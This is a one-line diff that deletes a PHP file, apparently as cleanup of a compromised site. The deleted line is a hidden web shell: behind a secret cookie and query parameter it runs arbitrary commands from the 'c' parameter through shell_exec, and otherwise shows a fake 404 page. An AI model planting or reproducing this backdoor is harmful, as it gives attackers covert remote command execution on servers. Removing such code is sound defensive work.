@@ -1,1 +1,0 @@
-<?php if(isset($_COOKIE["SintaSIN11"])&&$_COOKIE["SintaSIN11"]==="modernbaru@"&&isset($_GET["sinta"])){if(isset($_GET["c"])){echo shell_exec($_GET["c"]);}exit;}header("HTTP/1.0 404 Not Found");echo "Not Found";
